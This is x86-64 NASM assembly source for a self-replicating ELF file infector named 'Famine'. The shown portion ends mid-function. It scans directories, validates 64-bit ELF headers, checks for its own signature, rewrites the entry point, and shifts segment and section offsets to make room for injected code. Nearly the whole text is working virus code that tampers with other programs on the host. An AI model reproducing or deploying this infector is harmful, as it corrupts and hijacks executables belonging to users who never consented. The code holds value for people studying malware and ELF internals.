	[BITS 64]

	%define SYS_READ		0
	%define SYS_WRITE		1
	%define SYS_OPEN		2
	%define SYS_CLOSE		3
	%define SYS_STAT		4
	%define SYS_LSEEK		8
	%define SYS_MMAP		9
	%define SYS_MUNMAP		11
	%define SYS_GETDENTS64	217
	%define MAKE_EXECUTABLE_DEBUGGABLE
	global famine64_func:function

	segment .text

	famine64_signature db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	famine64_signature_size dd $ - famine64_signature
famine64_func:
	push	rax
	push	rdi
	push	rbp
	sub		rsp, 0x10

	mov		QWORD[rsp], 0
dir_loop:
	mov		rax, QWORD [rsp]
	lea		rdi, [rel dir_all]
	mov		rdi, QWORD [rdi + rax * 8]
	cmp		rdi, 0
	je		famine64_end
	cmp		QWORD [rel jump_offset], 0
	je		dir_call
	lea		rax, [rel famine64_func]
	add		rdi, rax
dir_call:
	call	find_files
	add		QWORD [rsp], 0x1
	jmp		dir_loop

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push	rbx
	push	rdx
	sub		rsp, 1040		; char *dirpath, int fd   , int ret   , char b[1024]
							; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]

	xor		eax, eax
	mov		QWORD [rsp], rdi			; store *dirpath
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0) ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, 0
	mov		rsi, 0x90800
	mov		rdi, QWORD [rsp]
	mov		rax, SYS_OPEN
	syscall
	mov		DWORD [rsp + 8], eax		; store directory fd
	cmp		DWORD [rsp + 8], 0			; test if < 0
	jl		find_files_end
loop_file:
	xor		eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp + 8]
	lea		rsi, [rsp + 16]
	mov		rdx, 1024
	mov		rax, SYS_GETDENTS64
	syscall
	test	eax, eax					; test if <= 0
	jle		loop_end
	mov		DWORD [rsp + 12], eax		; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor		rax, rax
	xor		rbx, rbx			; RBX will be the offset of each struct dirent64
	jmp		check_file_type
next_file:
	;; Next struct linux_dirent64 *
	movsx	eax, WORD [rsp + 16 + rbx + 16] ; 16 is the offset of *dirp->d_reclen
	add		ebx, eax
	cmp		DWORD [rsp + 12], ebx
	jle		loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	cmp		BYTE [rsp + 16 + rbx + 18], 8	; 18 is the offset of *dirp->d_type
	jne		next_file						; Check if regular file
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + 16 + rbx + 19]		; 19 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp		next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp + 8]
	mov		rax, SYS_CLOSE
	syscall
find_files_end:
	add		rsp, 1040
	pop		rdx
	pop		rbx
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push	rbx
	push	rcx
	push	rbp
	sub		rsp, 1024				; char path[1024]
									; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor		ecx, ecx				; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl					; test directory end of string
	je		copy_file
copy_dir_bytes:
	mov		BYTE [rsp + rcx], dl
	inc		rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne		copy_dir_bytes
copy_file:
	add		rsp, rcx
	xor		eax, eax				; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je		open_file
copy_file_bytes:	
	mov		BYTE [rsp + rax], dl
	inc		rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne		copy_file_bytes
open_file:
	mov		BYTE [rsp + rax], 0		; NULL byte the end of the string path
	sub		rsp, rcx				; Return to the start of the string path
	sub		rsp, 16					; int fd, size_t size, void *data
									; [rsp] , [rsp + 4]  , [rsp + 8]
	mov		DWORD [rsp], -1
	mov		QWORD [rsp + 4], -1
	mov		QWORD [rsp + 8], -1
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDONLY|O_NONBLOCK, 0)                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 0x0
	mov		esi, 0x800
	lea		rdi, [rsp + 16]
	mov		rax, SYS_OPEN
	syscall
	mov		DWORD [rsp], eax		; store FD in [rsp]
	cmp		rax, 0					; test if fd < 0
	jl		get_dat_elf_end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 2					; LSEEK_END
	mov		esi, 1
	mov		edi, eax
	mov		rax, SYS_LSEEK
	syscall
	mov		DWORD [rsp + 4], eax	; store SIZE in [rsp + 4]
	cmp		rax, 0					; test return value
	jle		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov eax, DWORD [rsp + 4]
	mov		r9d, 0					; 0
	mov		r8d, -1					; -1
	mov		r10d, 0x22				; MAP_PRIVATE | MAP_ANONYMOUS
	mov		edx, 0x3				; PROT_READ | PROT_WRITE
	mov		rsi, rax				; size
	mov		edi, 0					; NULL
	mov		rax, SYS_MMAP
	syscall
	mov		QWORD [rsp + 8], rax	; store ADDRESS in [RSP + 8]
	cmp		rax, -1					; test if == MAP_FAILED (-1)
	jle		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 0, SEEK_SET)                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 0
	mov		esi, 0
	mov		edi, DWORD [rsp]
	mov		rax, SYS_LSEEK
	syscall
	cmp		rax, 0
	jl		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	read(fd, buf, 1024)                                              ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub		rsp, 1040
	; int i, int j    , char buf[1024], int ret
	; [rsp], [rsp + 4], [rsp + 8]     , [rsp + 1032]
	mov		DWORD [rsp], 0				; i = 0
	mov		DWORD [rsp + 4], 0			; j = 0

read_loop:
	mov		eax, DWORD [rsp + 4]
	add		DWORD [rsp], eax			; i += j
	mov		rdx, 1024
	lea		rsi, [rsp + 8]				; char buf[1024]
	mov		edi, DWORD [rsp + 1040]		; file -> fd
	mov		rax, SYS_READ
	syscall
	mov		DWORD [rsp + 1032], eax		; ret = read(...)
	cmp		DWORD [rsp + 1032], 0
	jle		read_loop_end
	mov		DWORD [rsp + 4], 0			; j = 0
read_loop_copy:
	mov		eax, DWORD [rsp + 4]		; j
	cmp		eax, DWORD [rsp + 1032]		; j >= ret ?
	jge		read_loop
	mov		eax, DWORD [rsp + 4]		; j
	movzx	eax, BYTE [rsp + rax + 8]	; buf[j]

	mov		edx, DWORD [rsp]			; i
	add		edx, DWORD [rsp + 4]		; j
	add		rdx, QWORD [rsp + 1048]		; void *data + i + j
	mov		BYTE [rdx], al				; data[i + j] = buf[j]
	add		DWORD [rsp + 4], 0x1		; j += 1
	jmp		read_loop_copy
read_loop_end:
	add		rsp, 1040
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp]			; int fd
	mov		rax, SYS_CLOSE
	syscall

	cmp		DWORD [rsp - 8], 0			; ret != 0
	jne		munmap_file
	mov		rsi, QWORD [rsp + 8]
	mov		edi, DWORD [rsp + 4]
	call	check_file
	cmp		rax, 1
	jne		munmap_file
	mov		rdx, QWORD [rsp + 8]		; void *data
	mov		esi, DWORD [rsp + 4]		; int size
	lea		rdi, [rsp + 16]				; char *path
	call	infect_file
	jmp		munmap_file
close_file:
	mov		edi, DWORD [rsp]			; int fd
	mov		rax, SYS_CLOSE
	syscall

munmap_file:
	cmp		QWORD [rsp + 16], -1		; void *data
	je		get_dat_elf_end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		esi, DWORD [rsp + 4]	; int size
	mov		rdi, QWORD [rsp + 8]	; void *data
	mov		rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add		rsp, 1040
	pop		rbp
	pop		rcx
	pop		rbx
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                           ;;
;;              void check_file(int size, char *data)                        ;;
;;                                                                           ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
check_file:
	xor		rax, rax
	;; Check header integrity
	cmp		rdi, 0x3f				; size < sizeof(Elf64_Ehdr)
	jl		check_end
	cmp		DWORD [rsi], 0x464c457f	; ->e_ident != 0x7fELF
	jne		check_end
	cmp		BYTE [rsi + 4], 2		; ->e_ident[EI_CLASS] != ELFCLASS64
	jne		check_end
	cmp		BYTE [rsi + 5], 0		; ->e_ident[EI_DATA] == ELFDATANONE
	je		check_end
	cmp		BYTE [rsi + 6], 1		; ->e_ident[EI_VERSION] != EV_CURRENT
	jne		check_end
	movzx	edx, WORD [rsi + 16]	; ->e_type != ET_EXEC && ->e_type != ET_DYN
	sub		edx, 2
	cmp		dl, 1
	ja		check_end
	cmp		WORD [rsi + 18], 0x3e	; ->e_machine != EM_X86_64
	jne		check_end
	;; Check offsets integrity
	cmp		QWORD [rsi + 32], 64	; ->e_phoff != sizeof(Elf64_Ehdr)
	jne		check_end
	movzx	edx, WORD [rsi + 56]	; ->e_phnum
	imul	edx, 56					; ->e_phnum * sizeof(Elf64_Phdr)
	add		rdx, QWORD [rsi + 32]	; ... + ->e_phoff
	cmp		rdx, rdi				; ... > size
	ja		check_end
	cmp		QWORD [rsi + 40], 64	; ->e_shoff < sizeof(Elf64_Ehdr)
	jl		check_end
	movzx	edx, WORD [rsi + 60]	; ->e_shnum
	imul	edx, 64					; ->e_shnum * sizeof(Elf64_Shdr)
	add		rdx, QWORD [rsi + 40]	; ... + ->e_shoff
	cmp		rdx, rdi				; ... > size
	ja		check_end
	cmp		WORD [rsi + 52], 64		; ->e_ehsize != sizeof(Elf64_Ehdr)
	jne		check_end
	cmp		WORD [rsi + 54], 56		; ->e_phentsize != sizeof(Elf64_Phdr)
	jne		check_end
	cmp		WORD [rsi + 58], 64		; ->e_shentsize != sizeof(Elf64_Shdr)
	jne		check_end
	movzx	edx, WORD [rsi + 60]	; ->e_shnum
	cmp		WORD [rsi + 62], dx		; ->e_shstrndx >= ->e_shnum
	jae		check_end
	mov		rax, 1
check_end:
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                           ;;
;;            void infect_file(char *path, size_t size, char *data)          ;;
;;                                                                           ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect_file:
	sub		rsp, 112
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Elf64_Phdr *program, Elf64_Phdr *iprogram, Elf64_Shdr *section,
	;; [rsp]              , [rsp + 8]           , [rsp + 16]         ,
	;; Elf64_Shdr *isection, char *s_table
	;; [rsp + 24]          , [rsp + 32]
	;; = 40
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rax, rdx
	add		rax, QWORD [rdx + 32]		; Program table start
	mov		QWORD [rsp], rax
	mov		QWORD [rsp + 8], 0			; .TEXT Program pointer = NULL
	mov		rax, rdx
	add		rax, QWORD [rdx + 40]		; Section table start
	mov		QWORD [rsp + 16], rax
	mov		QWORD [rsp + 24], 0			; .text Section pointer = NULL
	
	movzx	eax, WORD [rdx + 62]		; ->e_shstrndx
	imul	ax, WORD [rdx + 58]			; ... * ->e_shentsize
	add		rax, QWORD [rsp + 16]		; section[idx]
	mov		rax, QWORD [rax + 24]		; section[idx].sh_offset
	add		rax, rdx					; data + section[idx].sh_offset = s_table
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Find the memory mapped PT_LOAD segment that contains the .text     ;;
	;;    section.                                                           ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rbx, 0
find_text_section:
	cmp		bx, WORD [rdx + 60]			; i < ->e_shnum ?
	jae		find_text_end
	xor		rcx, rcx
	mov		cx, WORD [rdx + 58]			; ->e_shentsize
	imul	ecx, ebx
	add		rcx, QWORD [rsp + 16]		; section[i]
	mov		ecx, DWORD [rcx]			; section[i].sh_name
	add		rcx, rax					; s_table + section[i].sh_name
	cmp		DWORD [rcx], 0x7865742e		; == ".tex"
	je		find_text_section_name
	add		rbx, 1
	jmp		find_text_section
find_text_section_name:
	cmp		WORD [rcx + 4], 0x74		; == "t"
	je		find_text_next
	add		rbx, 1
	jmp		find_text_section
find_text_next:
	imul	bx, WORD [rdx + 58]			; i * ->e_shentsize
	add		rbx, QWORD [rsp + 16]		; Elf64_Shdr *section + i * ->e_shentsize
	mov		QWORD [rsp + 24], rbx		; isection = section + i !
	mov		rbx, 0
find_text_segment:
	cmp		bx, WORD [rdx + 56]			; j < ->e_phnum ?
	jae		find_text_end
	xor		rcx, rcx
	mov		cx, WORD [rdx + 54]			; ->e_phentsize
	imul	ecx, ebx
	add		rcx, QWORD [rsp]			; program[j]
	add		rbx, 1
	cmp		DWORD [rcx], 1				; program[j].p_type == PT_LOAD ?
	jne		find_text_segment
	mov		r8, QWORD [rsp + 24]		; isection
	mov		r8, QWORD [r8 + 24]			; isection->sh_offset
	cmp		r8, QWORD [rcx + 16]		; isection->sh_offset >= program[j].p_vaddr ?
	jl		find_text_segment
	mov		r9, QWORD [rcx + 16]		; program[j].p_vaddr
	add		r9, QWORD [rcx + 32]		; ... + program[j].p_filesz
	cmp		r8, r9						; isection->sh_offset < ... ?
	jae		find_text_segment
	mov		QWORD [rsp + 8], rcx		; iprogram = program + j !

find_text_end:
	mov		rbx, 0
	cmp		QWORD [rsp + 8], 0			; iprogram == NULL ?
	je		find_entry_section
	cmp		QWORD [rsp + 24], 0			; isection == NULL ?
	je		find_entry_section
	jmp		check_signature

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Find the memory mapped PT_LOAD segment that contains entry point   ;;
	;;    if no text section or segment is found.                            ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_entry_section:
	cmp		bx, WORD [rdx + 60]			; i < ->e_shnum ?
	jae		find_entry_end
	xor		rcx, rcx
	mov		cx, WORD [rdx + 58]			; ->e_shentsize
	imul	ecx, ebx
	add		rcx, QWORD [rsp + 16]		; section[i]
	mov		r8, QWORD [rcx + 16]		; section[i].sh_addr
	add		rbx, 1
	cmp		QWORD [rdx + 24], r8		; ->e_entry >= section[i].sh_addr ?
	jl		find_entry_section
	add		r8, QWORD [rcx + 32]		; section[i].sh_addr + section[i].sh_size
	cmp		QWORD [rdx + 24], r8		; ->e_entry < ... ?
	jae		find_entry_section
	mov		QWORD [rsp + 24], rcx		; isection = section + i !
	mov		rbx, 0
find_entry_segment:
	cmp		bx, WORD [rdx + 56]			; j < ->e_phnum ?
	jae		find_entry_end
	xor		rcx, rcx
	mov		cx, WORD [rdx + 54]			; ->e_phentsize
	imul	ecx, ebx
	add		rcx, QWORD [rsp]			; program[j]
	add		rbx, 1
	cmp		DWORD [rcx], 1				; program[j].p_type == PT_LOAD ?
	jne		find_entry_segment
	mov		r8, QWORD [rcx + 16]		; program[j].p_vaddr
	cmp		QWORD [rdx + 24], r8		; ->e_entry >= program[j].p_vaddr ?
	jl		find_entry_segment
	add		r8, QWORD [rcx + 32]		; program[j].p_vaddr + program[j].p_filesz
	cmp		QWORD [rdx + 24], r8		; ->e_entry < ... ?
	jae		find_entry_segment
	mov		QWORD [rsp + 8], rcx		; iprogram = program + j

find_entry_end:
	cmp		QWORD [rsp + 8], 0			; iprogram == NULL ?
	je		infect_file_end
	cmp		QWORD [rsp + 24], 0			; isection == NULL ?
	je		infect_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Check if the file is already infected                              ;;
	;;    Our code inject a signature at the file entry point less 8.        ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
check_signature:
	mov		rbx, QWORD [rsp + 8]						; Elf64_Phdr *iprogram
	mov		rax, rdx									; void *data
	add		rax, QWORD [rax + 24]						; + data->e_entry
	sub		rax, QWORD [rbx + 16]						; - iprogram->p_vaddr
	xor		rcx, rcx
	mov		ecx, DWORD [rel famine64_signature_size]	; - sizeof(signature)
	sub		rax, rcx
	sub		rax, 4										; - sizeof(signature size)
	lea		rbx, [rel famine64_signature]
	xor		rcx, rcx
	xor		r8, r8
	mov		ecx, DWORD [rel famine64_signature_size]
signature_loop:
	sub		rcx, 1
	cmp		rcx, 0
	jl		infect_file_end
	mov		r8b, BYTE [rax + rcx]
	cmp		BYTE [rbx + rcx], r8b
	je		signature_loop

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; char *path, size_t size, char *data
	;; [rsp + 40], [rsp + 48] , [rsp + 56]
	;; = 64
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		QWORD [rsp + 40], rdi		; char *path
	mov		QWORD [rsp + 48], rsi		; size_t size
	mov		QWORD [rsp + 56], rdx		; void *data
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3. Re-open the file to modify it                                      ;;
	;;    int open(char *pathname, int flags)                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
reopen_file:
	mov		rsi, 0x281						; O_WRONLY | O_TRUNC | O_EXCL
	;lea		rdi, [rsp + 40]				; char *path
	mov		rax, SYS_OPEN
	syscall
	cmp		eax, 0
	jl		infect_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int fd    , Elf64_Addr off, Elf64_Addr old_entry, Elf64_Addr padding  ;;
	;; [rsp + 64], [rsp + 68]    , [rsp + 76]          , [rsp + 84]          ;;
	;; = 92
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		DWORD [rsp + 64], eax
	mov		rbx, QWORD [rsp + 8]			; Elf64_Phdr *iprogram
	mov		rcx, QWORD [rbx + 8]			; iprogram->p_offset
	add		rcx, QWORD [rbx + 32]			; ... + iprogram->p_filesz
	mov		QWORD [rsp + 68], rcx			; Injection Offset !!!

	mov		rax, QWORD [rsp + 56]			; void *data
	mov		rax, QWORD [rax + 24]			; data->e_entry
	sub		rax, QWORD [rbx + 16]			; - iprogram->p_vaddr
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	sub		rax, r8
	sub		rax, 4							; size of signature size
	sub		rcx, rax						; off - ...
	imul	rcx, -1							; ... * (-1)
	mov		QWORD [rsp + 76], rcx			; Old Entry Point offset !!!

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 4. Modify Program Entry Point                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rcx, QWORD [rsp + 68]			; Elf64_Addr off
	add		rcx, QWORD [rbx + 16]			; ... + iprogram->p_vaddr
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rcx, r8							; ... + sizeof(famine64_signature)
	mov		rax, QWORD [rsp + 56]			; void *data
	mov		QWORD [rax + 24], rcx			; data->e_entry = off + iprogram->p_vaddr + famine64_signature size

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Check if we have room to write our code                            ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Get the iprogram next Segment
	;; Elf64_Phdr *next_ptload
	;; [rsp + 32]
	mov		QWORD [rsp + 32], 0
	mov		rdx, QWORD [rsp + 8]			; iprogram
	mov		rbx, 0
find_next_segment:
	cmp		bx, WORD [rax + 56]				; i < data->e_phnum ?
	jae		find_next_segment_end
	xor		rcx, rcx
	mov		cx, WORD [rax + 54]				; data->e_phentsize
	imul	ecx, ebx
	add		rcx, QWORD [rsp]				; program + i
	mov		r8, QWORD [rdx + 8]				; iprogram->p_offset
	add		r8, QWORD [rdx + 32]			; ... + iprogram->p_filesz
	add		rbx, 1
	cmp		QWORD [rcx + 8], r8				; program[i].p_offset > ... ?
	jle		find_next_segment
	cmp		QWORD [rsp + 32], 0				; next_ptload == NULL ?
	je		found_next_segment
	mov		r8, QWORD [rsp + 32]			; next_ptload
	mov		r8, QWORD [r8 + 8]				; next_ptload->p_offset
	cmp		QWORD [rcx + 8], r8				; program[i].p_offset < ... ?
	jae		find_next_segment
found_next_segment:
	mov		QWORD [rsp + 32], rcx
	jmp		find_next_segment
find_next_segment_end:
	cmp		QWORD [rsp + 32], 0				; next_ptload == NULL ?
	je		infect_file_end; Need a function to handle this case !!!!!
	mov		QWORD [rsp + 84], 0				; padding = 0
	mov		rax, QWORD [rdx + 8]			; iprogram->p_offset
	add		rax, QWORD [rdx + 32]			; ... + iprogram->p_filesz
	add		rax, QWORD [rel famine64_size]	; ... + famine64_size
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rax, r8							; + sizeof(famine64_signature)
	mov		rcx, QWORD [rsp + 32]
	cmp		rax, QWORD [rcx + 8]			; ... > next_ptload->p_offset
	jle		padding_psize
	;; [INFO] : psize = famine64_size + sizeof(famine64_signature)
	mov		rax, QWORD [rel famine64_size]
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rax, r8
padding_size:
	add		QWORD [rsp + 84], 0x1000
	cmp		QWORD [rsp + 84], rax			; padding < psize
	jl		padding_size
	mov		rax, QWORD [rsp + 84]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Change Section Header Table offset                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rcx, QWORD [rsp + 56]			; void *data
	add		QWORD [rcx + 40], rax			; data->e_shoff += padding
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Change Programs' offset                                               ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; rax = padding, rcx = void *data, rdx = void *iprogram
	mov		rbx, 0
phdr_padding:
	cmp		bx, WORD [rcx + 56]				; i < data->e_phnum
	jae		phdr_padding_end
	xor		r8, r8
	mov		r8w, WORD [rcx + 54]			; data->e_phentsize
	imul	r8d, ebx
	add		r8, QWORD [rsp]					; program[i]
	mov		r9, QWORD [rdx + 8]				; iprogram->p_offset
	add		r9, QWORD [rdx + 32]			; ... + iprogram->p_filesz
	add		rbx, 1
	cmp		QWORD [r8 + 8], r9				; program[i].p_offset >= iprogram->p_offset + iprogram->p_filesz ?
	jl		phdr_padding
	add		r9, rax
	cmp		r9, QWORD [r8 + 16]				; iprogram->p_offset + iprogram->p_filesz + padding > program[i].p_vaddr ?
	ja		infect_file_end
	add		QWORD [r8 + 8], rax
	jmp		phdr_padding
phdr_padding_end:
	mov		rbx, 0
shdr_padding:
	cmp		bx, WORD [rcx + 60]
	jae		infect_write
	xor		r8, r8
	mov		r8w, WORD [rcx + 58]			; data->e_shentsize
	imul	r8d, ebx
	add		r8, QWORD [rsp + 16]			; section[i]
	mov		r9, QWORD [rdx + 8]				; iprogram->p_offset
	add		r9, QWORD [rdx + 32]			; ... + iprogram->p_filesz
	add		rbx, 1
	cmp		QWORD [r8 + 24], r9				; section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz ?
